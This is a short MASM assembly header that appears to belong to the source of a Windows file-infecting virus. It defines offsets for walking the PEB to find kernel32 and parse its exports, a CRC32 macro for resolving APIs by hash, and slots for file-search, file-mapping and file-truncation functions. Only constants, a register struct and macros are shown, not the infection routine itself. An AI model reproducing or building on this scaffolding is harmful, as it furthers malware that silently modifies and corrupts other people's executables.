rExitProcess                            equ    offset message - 400000h
HALFPTR                                 equ    4
SECTION_ID                              equ    4
e_lfanew                                equ    3ch
IMAGE_DIRECTORY_ENTRY_EXPORT            equ    78h
PEB                                     equ    30h
Ldr                                     equ    0ch
InMemoryOrderModuleList_Flink           equ    14h
off_k                                   equ    10h
esMapViewOfFile                         equ    dword ptr [esi + 4]
esFindNextFileA                         equ    dword ptr [esi + 8]
esFindFirstFileA                        equ    dword ptr [esi + 0ch]
esCreateFileMappingA                    equ    dword ptr [esi + 10h]
esCreateFileA                           equ    dword ptr [esi + 14h]
esUnmapViewOfFile                       equ    dword ptr [esi + 18h]
esSetFilePointer                        equ    dword ptr [esi + 20h]
esSetEndOfFile                          equ    dword ptr [esi + 1ch]

STACK_REG           struct
	    LO32_EDI                 dd     ?
	    LO32_ESI                 dd     ?
	    LO32_EBP                 dd     ?
	    LO32_ESP                 dd     ?
	    LO32_EBX                 dd     ?
	    LO32_EDX                 dd     ?
	    LO32_ECX                 dd     ?
	    LO32_EAX                 dd     ?      
STACK_REG           ends

publicz macro   _label
_label::
endm

crc32   macro
crc_l1:
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc_l2: 
        shr     eax, 1
        jnc     crc_l3
        xor     eax, 0edb88320h

crc_l3:
        loop    crc_l2
        inc     edi        
        cmp     byte ptr [edi], cl
        jne     crc_l1
endm

include    user32.inc
include    kernel32.inc
include    windows.inc
includelib user32.lib
includelib kernel32.lib
assume  fs:nothing
